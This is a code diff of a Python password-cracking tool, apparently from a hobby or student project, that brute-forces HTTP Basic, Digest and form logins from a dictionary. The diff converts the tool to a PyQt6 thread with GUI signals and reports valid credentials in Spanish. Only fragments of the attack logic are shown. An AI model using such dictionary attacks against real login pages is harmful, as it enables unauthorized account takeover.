@@ -1,11 +1,14 @@
 import threading
+from PyQt6.QtCore import QThread, pyqtSignal
 
 from requests.auth import HTTPBasicAuth, HTTPDigestAuth
 from HTTPrequest import HTTPrequest
 from selenium import webdriver
 
 
-class Cracker(HTTPrequest):
+class Cracker(QThread, HTTPrequest):
+    Info = pyqtSignal(str)
+
     def __init__(self, url, dictionary):
         super().__init__()
         self.url_attack = url
@@ -43,12 +46,12 @@ class Cracker(HTTPrequest):
             request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPBasicAuth(username, password)}
             response, result = self.request(request)
             if result['status'] < 0:
-                print('Error en la conexión')
+                self.Info.emit('Error en la conexión')
 
             if response.status_code == 200:
-                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
+                self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' válidos')
             else:
-                print('Usuario ' + username + ' y contraseña ' + password + ' no válidos')
+                self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' no válidos')
 
     def worker_digest(self):
         while self.index < len(self.combinations):
@@ -59,10 +62,10 @@ class Cracker(HTTPrequest):
             request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPDigestAuth(username, password)}
             response, result = self.request(request)
             if result['status'] < 0:
-                print('Error en la conexión')
+                self.Info.emit('Error en la conexión')
 
             if response.status_code == 200:
-                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
+                self.Info.emit('Usuario ' + username + ' y contraseña ' + password + ' válidos')
 
     def worker_form(self):
         driver = webdriver.Safari()
@@ -82,8 +85,13 @@ class Cracker(HTTPrequest):
 
         driver.close()
 
-    def attack(self):
+    def run(self):
         self.read_dict()
+        self.Info.emit('Iniciando ataque...')
+        result = self.detect_auth()
+        if result['status'] < 0:
+            self.Info.emit('No se admiten peticiones HTTP')
+            self.terminate()
         thread_count = 1
         threads = []
         for i in range(thread_count):
